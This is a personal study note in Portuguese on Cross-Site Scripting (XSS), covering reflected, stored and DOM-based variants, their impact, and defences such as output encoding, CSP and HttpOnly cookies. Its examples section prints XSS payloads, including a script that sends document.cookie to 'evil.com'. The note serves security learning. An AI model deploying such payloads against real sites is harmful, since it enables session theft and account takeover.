---
type: concept
area: estudos
status: active
progresso: "estudando"
created: "2026-08-15"
updated: "2026-08-20"
---

# XSS

#area/estudos #estudos/seguranca #conceito

**Resumo:** Cross-Site Scripting: ataque que injeta scripts no navegador da vítima, executando código no contexto do site confiável e roubando sessões ou dados.

## Conceitos-chave
- **Refletido:** payload vai na URL/request e é refletido na resposta; exige interação (link malicioso).
- **Armazenado (persistente):** payload fica salvo no servidor e atinge todos que veem o conteúdo — mais crítico.
- **DOM-based:** a vulnerabilidade está no JavaScript cliente que processa dados não sanitizados.
- **Impacto:** roubo de cookies/sessão, sequestro de conta, keylogging, defacement, propagação de malware.
- **Prevenção:** escapar/sanitizar output, codificação por contexto (HTML, atributo, JS), CSP.
- **CSP (Content Security Policy):** restringe fontes de scripts, limitando o dano mesmo se injetar.

## Exemplos
```html
<!-- Payload clássico de XSS -->
<script>alert(document.cookie)</script>

<!-- Roubo de sessão (conceitual) -->
<script>
  new Image().src = "https://evil.com/c?c=" + document.cookie;
</script>

<!-- Input vulnerável -->
<input value="<%= usuario.nome %>">   <!-- se nome não for escapado -->
```

```http
# Resposta segura: CSP restritiva
Content-Security-Policy: default-src 'self'; script-src 'self'
```

## Boas práticas
- Escapar toda saída de dados no contexto correto (HTML, atributo, JS, CSS, URL).
- Validar e normalizar entrada no servidor (whitelist quando possível).
- Usar frameworks que escapam por padrão (React, Angular) e evitar `dangerouslySetInnerHTML`.
- Definir CSP e cookies `HttpOnly` + `Secure` para mitigar roubo de sessão.
- Testar com scanners e payloads em campos de input (ver [[Pentest]]).

## Armadilhas comuns
- Achar que só sanitizar entrada resolve — a saída é o ponto crítico (output encoding).
- Usar `innerHTML`/`v-html`/`dangerouslySetInnerHTML` sem necessidade.
- Sanitização parcial (só `<script>`) — bypass com encodings, eventos e atributos.
- Confiar em CSP como única camada; ela mitiga, mas escapar continua necessário.

## Relacionadas
- [[OWASP]]
- [[CSRF]]
- [[SQL-Injection]]
- [[Tokens]]